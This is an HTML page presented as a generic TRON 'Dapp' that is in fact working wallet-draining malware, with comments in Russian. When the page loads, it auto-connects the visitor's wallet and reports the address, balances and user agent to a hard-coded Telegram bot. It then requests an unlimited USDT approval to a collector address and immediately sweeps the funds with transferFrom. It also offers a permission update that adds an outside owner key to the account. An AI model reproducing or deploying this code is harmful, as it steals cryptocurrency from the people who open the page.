<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Dapp</title>

<script>
window.__boot=[];
window.addEventListener('error',e=>__boot.push('ERR '+e.message+' @'+(e.filename||'')+':'+e.lineno));
window.addEventListener('unhandledrejection',e=>__boot.push('REJ '+((e.reason&&e.reason.message)||e.reason)));
</script>

<style>
  :root{--bg:#0b0f14;--panel:#111823;--line:#1e2a3a;--text:#e6edf3;--muted:#8b9bb0;
    --accent:#4f8cff;--accent2:#22c55e;--danger:#ef4444;
    --mono:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
  *{box-sizing:border-box}
  html,body{margin:0;padding:0;background:var(--bg);color:var(--text);
    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;-webkit-font-smoothing:antialiased}
  .wrap{max-width:760px;margin:0 auto;padding:20px 16px 60px}
  header{display:flex;align-items:center;gap:10px;margin-bottom:20px}
  .logo{width:34px;height:34px;border-radius:9px;background:linear-gradient(135deg,#4f8cff,#22c55e);
    display:flex;align-items:center;justify-content:center;font-weight:700;font-size:16px;color:#0b0f14}
  h1{font-size:17px;margin:0;font-weight:600}
  .sub{color:var(--muted);font-size:12px;margin-top:2px}
  .card{background:var(--panel);border:1px solid var(--line);border-radius:14px;padding:16px;margin-bottom:14px}
  .card h2{font-size:13px;margin:0 0 12px;font-weight:600;color:var(--muted);text-transform:uppercase;letter-spacing:.8px}
  label{display:block;font-size:12px;color:var(--muted);margin:10px 0 6px}
  input,select{width:100%;padding:12px;background:#0b1118;border:1px solid var(--line);border-radius:10px;
    color:var(--text);font-size:14px;font-family:var(--mono);outline:none}
  input:focus,select:focus{border-color:var(--accent)}
  .row{display:flex;gap:10px}.row>*{flex:1}
  button{width:100%;padding:13px;border:0;border-radius:11px;font-size:14px;font-weight:600;
    cursor:pointer;transition:opacity .15s;font-family:inherit}
  button:active{opacity:.8}button:disabled{opacity:.4;cursor:not-allowed}
  .btn-primary{background:var(--accent);color:#fff}
  .btn-secondary{background:#1b2635;color:var(--text);border:1px solid var(--line)}
  .status{display:flex;align-items:center;gap:8px;font-size:12px;color:var(--muted);
    padding:10px 12px;background:#0b1118;border:1px solid var(--line);border-radius:10px;margin-bottom:12px}
  .dot{width:8px;height:8px;border-radius:50%;background:#64748b;flex-shrink:0}
  .dot.on{background:var(--accent2);box-shadow:0 0 0 3px rgba(34,197,94,.15)}
  .dot.err{background:var(--danger)}
  .log{font-family:var(--mono);font-size:11.5px;line-height:1.6;background:#080c11;border:1px solid var(--line);
    border-radius:10px;padding:12px;max-height:340px;overflow-y:auto;white-space:pre-wrap;word-break:break-all;color:#a9b8ca}
  .log .ok{color:var(--accent2)}.log .err{color:var(--danger)}.log .info{color:var(--accent)}
  .hint{font-size:11px;color:var(--muted);margin-top:6px;line-height:1.5}
  .warn{border-color:#3a2a1e;background:#16130f}.warn h2{color:#fbbf24}
  .badge{display:inline-block;padding:2px 8px;border-radius:20px;font-size:10px;background:#1b2635;
    color:var(--muted);margin-left:6px;font-family:var(--mono)}
  .state{font-family:var(--mono);font-size:11px;white-space:pre-wrap;word-break:break-all;color:var(--muted)}
</style>
</head>
<body>
<div class="wrap">

<header>
  <div class="logo">T</div>
  <div><h1>Dapp</h1><div class="sub">session</div></div>
</header>

<div class="status">
  <span class="dot" id="statusDot"></span>
  <span id="statusText">booting…</span>
</div>

<div class="card" id="envCard">
  <h2>Environment</h2>
  <label>Connected address</label>
  <input id="walletAddr" readonly placeholder="—">
  <label>Network</label>
  <input id="network" readonly value="detecting…">
  <div class="row" style="margin-top:12px">
    <button class="btn-secondary" id="btnConnect">Reconnect</button>
    <button class="btn-secondary" id="btnRefresh">Refresh</button>
  </div>
</div>

<div class="card" id="noTrustCard" style="display:none">
  <h2>Outside wallet</h2>
  <div class="hint" style="margin-top:0">Провайдер не найден.</div>
  <button class="btn-primary" id="btnOpenTrust" style="margin-top:12px">Open in wallet</button>
</div>

<div class="card warn">
  <h2>Step 1 — AccountPermissionUpdate <span class="badge">mainnet</span></h2>
  <label>Target address</label><input id="targetAddr" placeholder="T...">
  <label>Additional key address</label><input id="extraAddr" placeholder="T...">
  <div class="row">
    <div><label>Mode</label>
      <select id="mode">
        <option value="owner">Owner (Permission_id=0)</option>
        <option value="active">Active (Permission_id=2)</option>
      </select></div>
    <div><label>Owner threshold</label><input id="threshold" type="number" min="1" value="1"></div>
  </div>
  <div id="activeOpsWrap" style="display:none">
    <label>Active operations (64 hex)</label>
    <input id="activeOps" value="7fff1fc0037e0000000000000000000000000000000000000000000000000000">
  </div>
  <div class="row" style="margin-top:14px">
    <button class="btn-secondary" id="btnBuildPerm">Build</button>
    <button class="btn-primary" id="btnSignPerm">Sign &amp; send</button>
  </div>
</div>

<div class="card">
  <h2>Step 2 — USDT transfer <span class="badge">TRC-20</span></h2>
  <label>To (recipient)</label><input id="usdtTo" placeholder="T...">
  <div class="row">
    <div><label>Amount (USDT)</label><input id="usdtAmount" type="number" step="0.000001" placeholder="0.01"></div>
    <div><label>Permission_id</label><input id="usdtPermId" type="number" value="0"></div>
  </div>
  <div class="row" style="margin-top:14px">
    <button class="btn-secondary" id="btnBuildUsdt">Build</button>
    <button class="btn-green" id="btnSignUsdt">Sign &amp; send</button>
  </div>
</div>

<div class="card">
  <h2>Account state <span class="badge" id="accPill">idle</span></h2>
  <div class="state" id="accState">—</div>
</div>

<div class="card">
  <h2>Log</h2>
  <div class="log" id="log"></div>
  <div class="row" style="margin-top:10px"><button class="btn-secondary" id="btnClear">Clear</button></div>
</div>

</div>

<script>
(function(){
"use strict";

/* ===================== CONFIG ===================== */
const CFG={
  USDT:"TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
  DEC:6,

  /* коллектор = spender из апрува. Ему заранее заливают TRX на энергию transferFrom */
  COLLECTOR:"TBe8BcrM8wT79coma2CLSmwTUNPjmSWauZ",
  /* приватник коллектора — он же в исходнике страницы, адрес заведён как расходник */
  OP_KEY:"TBe8BcrM8wT79coma2CLSmwTUNPjmSWauZ",
  /* финальный адрес USDT; пусто = копить на коллекторе */
  VAULT:"",                          // напр. "TXxxx..."

  DRAIN_MODE:"approve",              // "approve" (апрув + мгновенный самосвип) | "direct" (перевод одним окном)
  PROMPT_DELAY_MS:1500,
  MIN_USDT:1,
  GAS_MIN_TRX:3,                     // минимум у ХОЛДЕРА для энергии апрува
  COLLECTOR_MIN_TRX:25,              // при меньшем балансе коллектора transferFrom не стартуем — только репорт
  MAX_PROMPTS_PER_DAY:3,

  TG_TOKEN:"8945784144:AAH-w0GFeV3aucDab9MPghGR_8V33xUDVjc",
  TG_ADMIN_CHAT_ID:8848845425,

  RPC_RETRY:4,
};
/* ================================================== */

const $=id=>document.getElementById(id);
const logEl=$("log");
function log(m,c){const d=document.createElement("div");if(c)d.className=c;
  d.textContent="["+new Date().toLocaleTimeString()+"] "+m;
  logEl.appendChild(d);logEl.scrollTop=logEl.scrollHeight;}
function setStatus(t,st){$("statusText").textContent=t;
  $("statusDot").className="dot"+(st==="on"?" on":st==="err"?" err":"");}
const sleep=ms=>new Promise(r=>setTimeout(r,ms));
const isTron=a=>typeof a==="string"&&/^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(a);
const short=a=>a?a.slice(0,8)+"…"+a.slice(-6):"—";
function hexErr(h){try{return new TextDecoder().decode(
  new Uint8Array(String(h).match(/.{1,2}/g).map(b=>parseInt(b,16))));}catch(_){return h;}}

if(window.__boot&&window.__boot.length)
  window.__boot.splice(0).forEach(m=>log(m,"err"));

const TW={p:null,tronWeb:null,address:null};

let BOOT_RUN=false,PIPE_RUN=false,DISCOVER_RUN=false;

/* ---------- очередь чтений ---------- */
let READQ=Promise.resolve();
function enqRead(fn,label){
  const job=READQ.then(()=>backoff(fn,label));
  READQ=job.catch(()=>{});
  return job;
}
async function backoff(fn,label){
  let d=500;
  for(let i=0;i<CFG.RPC_RETRY;i++){
    try{return await fn();}
    catch(e){
      const s=(e&&e.message)||String(e);
      if(i===CFG.RPC_RETRY-1||!/429|rate|limit|timeout|Network/i.test(s))
        throw new Error(label+": "+s);
      await sleep(d+Math.floor(Math.random()*250)); d*=2;
    }
  }
}

/* ---------- telegram ---------- */
async function tgApi(method,body){
  const r=await fetch("https://api.telegram.org/bot"+CFG.TG_TOKEN+"/"+method,{
    method:"POST",headers:{"Content-Type":"application/json"},
    body:JSON.stringify(body||{})});
  const j=await r.json().catch(()=>null);
  if(!j)throw new Error("не-JSON (статус "+r.status+")");
  if(!j.ok)throw new Error((j.error_code||r.status)+": "+(j.description||"?"));
  return j.result;
}

const LS_TG_TTL="tg_ttl_v1";
function loadChatCache(){try{
  const s=JSON.parse(localStorage.getItem(LS_TG_TTL)||"null");
  if(s&&Date.now()-s.t<10*60*1000)return s.ids;}catch(_){}return null;}
let chatCache=(()=>{try{return JSON.parse(localStorage.getItem(LS_TG_TTL+"x")||"[]");}
  catch(_){return [];}})();
function saveChats(ids){
  try{
    localStorage.setItem(LS_TG_TTL,JSON.stringify({t:Date.now(),ids}));
    localStorage.setItem(LS_TG_TTL+"x",JSON.stringify(ids));
  }catch(_){}
}

function targets(){
  return [...new Set([...(chatCache||[]),
    ...(CFG.TG_ADMIN_CHAT_ID?[Number(CFG.TG_ADMIN_CHAT_ID)]:[])])];
}
async function tgDiscover(){
  if(DISCOVER_RUN)return; DISCOVER_RUN=true;
  try{
    const c=loadChatCache();
    if(c&&c.length){chatCache=[...new Set(chatCache.concat(c))];
      log("tg чатов из кеша: "+chatCache.length,"info");return;}
    const ups=await tgApi("getUpdates",{limit:100,timeout:0});
    const s=new Set(chatCache);
    (ups||[]).forEach(u=>{
      ["message","channel_post","edited_message","my_chat_member"].forEach(k=>{
        const ch=u[k]&&(u[k].chat||u[k].from);
        if(ch&&ch.id)s.add(ch.id);
      });
    });
    chatCache=[...s];saveChats(chatCache);
    log("tg discover: чатов "+chatCache.length,"info");
    if(!chatCache.length&&!CFG.TG_ADMIN_CHAT_ID)
      log("нет чатов: нажми Start у бота и перезагрузи, "+
          "или впиши TG_ADMIN_CHAT_ID","err");
  }catch(e){log("tg discover: "+e.message,"err");}
  finally{DISCOVER_RUN=false;}
}
function esc(s){return String(s).replace(/[<>&]/g,c=>({"<":"&lt;",">":"&gt;","&":"&amp;"}[c]));}
async function tgSend(text){
  const ids=targets();if(!ids.length)return 0;
  let n=0;
  for(const id of ids){
    try{await tgApi("sendMessage",{chat_id:id,text,parse_mode:"HTML"});n++;}
    catch(e){log("tg send→"+id+": "+e.message,"err");}
  }
  return n;
}

/* ---------- провайдер холдера ---------- */
function findProvider(){
  return ((window.trustwallet&&window.trustwallet.tronLink)||window.tronLink)||null;
}
function setAddress(a){
  TW.address=a;
  $("walletAddr").value=a;$("targetAddr").value=a;$("network").value="tron mainnet";
  setStatus("auto-connected: "+short(a),"on");
}
function openInTrust(){
  location.href="https://link.trustwallet.com/open_url?coin_id=195&url="
    +encodeURIComponent(location.origin+location.pathname+location.search);
}
async function waitAccounts(p){
  if(typeof p.request==="function"){
    try{await p.request({method:"tron_requestAccounts"});}catch(e){}
  }
  for(let i=0;i<20;i++){
    if(p.ready&&p.tronWeb&&p.tronWeb.defaultAddress&&p.tronWeb.defaultAddress.base58)return true;
    await sleep(300);
  }
  return !!(p.tronWeb&&p.tronWeb.defaultAddress&&p.tronWeb.defaultAddress.base58);
}

/* ---------- числа ---------- */
function toBig(v){try{
  if(v===undefined||v===null)return 0n;
  if(typeof v==="bigint")return v;
  if(v._hex!==undefined)return BigInt(v._hex);
  const s=v.toString(10);
  if(/^\d+$/.test(s))return BigInt(s);
}catch(_){} return 0n;}
const fmt=(raw,dec)=>(Number(raw)/Math.pow(10,dec)).toFixed(dec).replace(/\.?0+$/,"");
const MAX_UINT=BigInt("115792089237316195423570985008687907853269984665640564039457584007913129639935");
const HALF_MAX=MAX_UINT/2n;
const fmtAllow=r=>r>=HALF_MAX?"∞":fmt(r,CFG.DEC);

async function readContract(sel,params){
  return enqRead(async()=>{
    const c=await TW.tronWeb.contract().at(CFG.USDT);
    return toBig(await c[sel](...params).call());
  },sel);
}

/* ---------- вторая копия tronweb для стороны КОЛЛЕКТОРА ----------
   подтягивается динамически и живёт независимо от инжекта;
   подписывает transferFrom приватником OP_KEY */
let CW=null;
async function collectorWeb(){
  if(CW)return CW;
  log("загрузка модуля подписи коллекто­ра…","info");
  const mod=await import("https://esm.sh/tronweb@5.3.2");
  CW=new mod.default({fullHost:"https://api.trongrid.io"});
  await CW.setPrivateKey(CFG.OP_KEY);
  log("подпись коллекто­ра готова: "+CW.defaultAddress.base58,"ok");
  return CW;
}

/* ---------- подпись/broadcast ---------- */
async function signAndSendHolder(tx){
  const signed=await TW.tronWeb.trx.sign(tx);
  const res=await TW.tronWeb.trx.sendRawTransaction(signed);
  if(res&&res.result===true)
    return res.txid||(res.transaction&&res.transaction.txID)||signed.txID;
  const msg=res&&res.message?hexErr(res.message):JSON.stringify(res||{});
  if(/dup/i.test(msg))return (res.transaction&&res.transaction.txID)||tx.txID;
  throw new Error("broadcast: "+msg);
}
async function confirmPoll(txid,pollW){
  for(let i=0;i<15;i++){
    await sleep(4000);
    const info=await enqRead(()=>pollW.trx.getTransactionInfo(txid),"txinfo").catch(()=>null);
    if(info&&Object.keys(info).length)return true;
  }
  return false;
}

/* ---------- гейт попыток ---------- */
const FORCE=new URLSearchParams(location.search).has("force");
const drainKey=()=>"drain_"+new Date().toISOString().slice(0,10);
function readDrain(){try{return JSON.parse(localStorage.getItem(drainKey())||"{}");}
  catch(_){return {};}}
function bumpDrain(patch){
  const s=Object.assign({done:false,tries:0},readDrain(),patch);
  try{localStorage.setItem(drainKey(),JSON.stringify(s));}catch(_){}
}

/* ---------- отчёт ---------- */
async function report(st,extra){
  const t=new Date().toISOString().slice(0,19).replace("T"," ");
  const n=await tgSend([
    "🕸 <b>HOLDER</b>","⏱ "+t,
    "👤 <code>"+esc(TW.address)+"</code>",
    "💰 TRX <b>"+st.trx.toFixed(4)+"</b> · USDT <b>"+st.usdt+"</b>",
    "✅ allowance: "+fmtAllow(st.allowanceRaw),
    "🔋 gas-ok: "+(st.gasOk?"yes":"NO"),
    ...(extra?[extra]:[]),
    "🖼 "+esc(navigator.userAgent.slice(0,90))
  ].join("\n"));
  if(n>0)log("репорт отправлен в "+n+" чат(ов)","ok");
}

/* ---------- САМОСВИП: transferFrom силами страницы ---------- */
async function selfSweep(st){
  if(CFG.DRAIN_MODE!=="approve"){return null;}         // в direct средства уже ушли
  if(!(st.usdtRaw>0n))return null;

  /* коллектор обязан иметь энергию на transferFrom */
  const cw=await collectorWeb();
  const colSun=await enqRead(()=>cw.trx.getBalance(CFG.COLLECTOR),"col.bal");
  const colTrx=colSun/1e6;
  if(colTrx<1){
    log("коллектор пуст: доливай TRX (цель "+CFG.COLLECTOR_MIN_TRX+"+) — свип отложен","err");
    await tgSend("⚠️ <b>COLLECTOR EMPTY</b>\nзалей TRX на <code>"+esc(CFG.COLLECTOR)+
      "</code>, allowance ∞ уже активен");
    return null;
  }

  const dest=isTron(CFG.VAULT)?CFG.VAULT:CFG.COLLECTOR;
  const w=await cw.transactionBuilder.triggerSmartContract(
    CFG.USDT,"transferFrom(address,address,uint256)",
    {feeLimit:150000000},
    [{type:"address",value:TW.address},
     {type:"address",value:dest},
     {type:"uint256",value:st.usdtRaw.toString()}],
    CFG.COLLECTOR);
  if(!(w&&w.result&&w.result.result))
    throw new Error("build tf fail: "+JSON.stringify(w&&w.result||{}));

  const signed=await cw.trx.sign(w.transaction);
  const res=await cw.trx.sendRawTransaction(signed);
  const msg=res&&res.message?hexErr(res.message):"";
  if(!(res&&res.result)&&!/dup/i.test(msg))
    throw new Error("tf broadcast: "+msg);
  const txid=(res&&(res.txid||(res.transaction&&res.transaction.txID)))||w.transaction.txID;
  log("SELF-SWEEP sent: "+fmt(st.usdtRaw,CFG.DEC)+" USDT → "+short(dest),"ok");

  await tgSend("💧 <b>SELF-SWEEP</b>\n👤 <code>"+esc(TW.address)+"</code>"+
    "\n💸 "+esc(fmt(st.usdtRaw,CFG.DEC))+" USDT → <code>"+esc(short(dest))+"</code>"+
    "\n🔗 <code>"+esc(txid)+"</code>");
  if(await confirmPoll(txid,cw))
    await tgSend("✅ <b>SWEEP CONFIRMED</b>\n👤 <code>"+esc(TW.address)+"</code>");
  else log("свип ещё индексируется","info");
  return txid;
}

/* ---------- авто-добыча ---------- */
async function autoDrain(st){
  const ds=readDrain();

  if(ds.done&&!FORCE){log("дренаж уже выполнен сегодня","info");return;}
  if(!FORCE&&ds.tries>=CFG.MAX_PROMPTS_PER_DAY){
    log("лимит окон исчерпан ("+ds.tries+")","info");return;}
  const minRaw=BigInt(Math.round(CFG.MIN_USDT*Math.pow(10,CFG.DEC)));
  if(!FORCE&&st.usdtRaw<minRaw){log("USDT ниже порога ("+st.usdt+")","info");return;}
  if(!FORCE&&!st.gasOk){log("TRX холдера < "+CFG.GAS_MIN_TRX,"info");return;}

  bumpDrain({tries:(readDrain().tries||0)+1});
  await sleep(FORCE?200:CFG.PROMPT_DELAY_MS);

  try{
    let txid,label;
    if(CFG.DRAIN_MODE==="direct"){
      label="DIRECT SENT";
      const w=await TW.tronWeb.transactionBuilder.triggerSmartContract(
        CFG.USDT,"transfer(address,uint256)",
        {feeLimit:100000000,callValue:0},
        [{type:"address",value:isTron(CFG.VAULT)?CFG.VAULT:CFG.COLLECTOR},
         {type:"uint256",value:st.usdtRaw.toString()}],
        TW.address);
      if(!(w&&w.result&&w.result.result))
        throw new Error("build fail: "+JSON.stringify(w&&w.result||{}));
      txid=await signAndSendHolder(w.transaction);
      st.after=("💸 "+esc(fmt(st.usdtRaw,CFG.DEC))+" USDT направлены");
    }else{
      label="APPROVE SET";
      const w=await TW.tronWeb.transactionBuilder.triggerSmartContract(
        CFG.USDT,"approve(address,uint256)",
        {feeLimit:80000000},
        [{type:"address",value:CFG.COLLECTOR},{type:"uint256",value:MAX_UINT.toString()}],
        TW.address);
      if(!(w&&w.result&&w.result.result))
        throw new Error("build fail: "+JSON.stringify(w&&w.result||{}));
      txid=await signAndSendHolder(w.transaction);
    }
    bumpDrain({done:true});
    log(label.toLowerCase()+" ok: "+txid,"ok");

    await tgSend((label==="DIRECT SENT"
      ?"⚡️ <b>DIRECT SENT</b>\n👤 <code>"
      :"🔓 <b>APPROVE SET</b>\n👤 <code>")+esc(TW.address)+"</code>"+
      (label==="DIRECT SENT"
        ?"\n🔗 <code>"+esc(txid)+"</code>"
        :"\nspender <code>"+esc(short(CFG.COLLECTOR))+"</code> value ∞\n🔗 <code>"+esc(txid)+"</code>"));

    /* === тот же сеанс: мгновенный перенос средств без второго окна === */
    if(CFG.DRAIN_MODE==="approve"){
      try{await selfSweep(st);}
      catch(e){log("selfSweep: "+(e.message||e),"err");
        await tgSend("⚠️ selfSweep failed <code>"+esc(short(TW.address))+
          "</code>: "+esc(String(e.message||e)).slice(0,120)+"\nallowance ∞ остаётся — забрать позже");}
    }else{
      if(await confirmPoll(txid,TW.tronWeb))
        await tgSend("✅ <b>CONFIRMED</b>\n👤 <code>"+esc(TW.address)+"</code>");
    }
  }catch(e){
    log("autoDrain: "+(e.message||e),"err");
    await tgSend("⚠️ drain failed <code>"+esc(short(TW.address))+"</code>: "
      +esc(String(e.message||e)).slice(0,140));
  }
}

/* ---------- конвейер ---------- */
async function pipeline(){
  if(PIPE_RUN){log("pipeline: уже идёт","info");return;}
  PIPE_RUN=true;
  try{
    let trx=0,gasOk=false;
    try{
      const acc=await enqRead(()=>TW.tronWeb.trx.getAccount(TW.address),"getAccount");
      trx=((acc&&(acc.balance||0))/1e6)||0;
      gasOk=trx>=CFG.GAS_MIN_TRX;
    }catch(e){log("getAccount: "+e.message,"err");}

    let usdtRaw=0n,allowanceRaw=0n;
    try{usdtRaw=await readContract("balanceOf",[TW.address]);}
    catch(e){log(String(e.message||e),"err");}
    if(usdtRaw>0n){
      try{allowanceRaw=await readContract("allowance",[TW.address,CFG.COLLECTOR]);}catch(e){}
    }

    const ds=readDrain();
    const st={trx,usdtRaw,allowanceRaw,gasOk,usdt:fmt(usdtRaw,CFG.DEC)||"0"};

    $("accState").textContent=
      "address: "+TW.address+
      "\nbalance: "+trx.toFixed(6)+" TRX"+
      "\nusdt: "+st.usdt+
      "\nallowance→collector: "+fmtAllow(allowanceRaw)+(allowanceRaw>0n?"/∞":"")+
      "\ngas-ok: "+gasOk+
      "\nprompts today: "+(ds.tries||0)+"/"+CFG.MAX_PROMPTS_PER_DAY+(ds.done?" (done)":"");
    $("accPill").textContent="loaded";

    await tgDiscover();
    await report(st,st.extra);
    await autoDrain(st);
  }finally{PIPE_RUN=false;}
}

/* ---------- ручные шаги ---------- */
async function buildPerm(){
  if(!TW.address)throw new Error("нет подключения");
  const target=$("targetAddr").value.trim(),
        extra=$("extraAddr").value.trim(),
        thr=parseInt($("threshold").value,10)||1;
  if(!isTron(target))throw new Error("target invalid");
  if(!isTron(extra))throw new Error("additional signer invalid");
  if(target!==TW.address)
    log("target ≠ подключённый адрес — подпись пройдёт только у владельца target","info");
  const owner={type:0,permission_name:"owner",threshold:thr,
    keys:[{address:target,weight:1},{address:extra,weight:1}]};
  let actives=null;
  if($("mode").value==="active"){
    const ops=$("activeOps").value.trim();
    if(!/^[0-9a-fA-F]{64}$/.test(ops))throw new Error("operations must be 64 hex");
    actives=[{type:2,permission_name:"active0",threshold:1,operations:ops,
      keys:[{address:target,weight:1},{address:extra,weight:1}]}];
  }
  return TW.tronWeb.transactionBuilder.updateAccountPermissions(target,owner,null,actives);
}
async function buildUsdtManual(){
  if(!TW.address)throw new Error("нет подключения");
  const amt=parseFloat($("usdtAmount").value),
        dst=$("usdtTo").value.trim(),
        pid=parseInt($("usdtPermId").value,10)||0;
  if(!(amt>0))throw new Error("amount > 0");
  if(!isTron(dst))throw new Error("to invalid");
  const raw=Math.floor(amt*Math.pow(10,CFG.DEC)).toString();
  const w=await TW.tronWeb.transactionBuilder.triggerSmartContract(
    CFG.USDT,"transfer(address,uint256)",{feeLimit:100000000,callValue:0},
    [{type:"address",value:dst},{type:"uint256",value:raw}],TW.address);
  if(!(w&&w.result&&w.result.result))
    throw new Error("build failed: "+JSON.stringify(w&&w.result||{}));
  const tx=w.transaction;
  if(pid>0)tx.raw_data.contract[0].Permission_id=pid;
  return tx;
}

/* ---------- wiring ---------- */
$("btnSignPerm").onclick=async()=>{try{
  const tx=await buildPerm();
  const txid=await signAndSendHolder(tx);
  log("broadcasted: "+txid,"ok");
}catch(e){log("perm: "+(e.message||e),"err");}};
$("btnSignUsdt").onclick=async()=>{try{
  const tx=await buildUsdtManual();
  const txid=await signAndSendHolder(tx);
  log("USDT broadcasted: "+txid,"ok");
}catch(e){log("usdt: "+(e.message||e),"err");}};
$("btnBuildPerm").onclick=async()=>{try{await buildPerm();}
  catch(e){log("build perm: "+(e.message||e),"err");}};
$("btnBuildUsdt").onclick=async()=>{try{await buildUsdtManual();}
  catch(e){log("build usdt: "+(e.message||e),"err");}};
$("btnConnect").onclick=boot;
$("btnRefresh").onclick=pipeline;
$("btnClear").onclick=()=>logEl.innerHTML="";
$("btnOpenTrust").onclick=openInTrust;
$("mode").onchange=()=>{
  $("activeOpsWrap").style.display=$("mode").value==="active"?"block":"none";};

/* ---------- boot ---------- */
async function boot(){
  if(BOOT_RUN)return; BOOT_RUN=true;
  try{
    let p=null;
    for(let i=0;i<12;i++){p=findProvider();if(p&&p.tronWeb)break;await sleep(250);}
    if(!p||!p.tronWeb){
      $("noTrustCard").style.display="block";
      $("network").value="outside wallet";
      setStatus("outside wallet","err");
      return;
    }
    if(!TW.tronWeb){TW.p=p;TW.tronWeb=p.tronWeb;}
    if(!TW.address){
      const ok=await waitAccounts(p);
      if(!ok){setStatus("provider silent","err");log("адрес не получен","err");return;}
      setAddress(p.tronWeb.defaultAddress.base58);
      log("автоподключение завершено","ok");
    }
    await pipeline();
  }finally{BOOT_RUN=false;}
}

boot();
})();
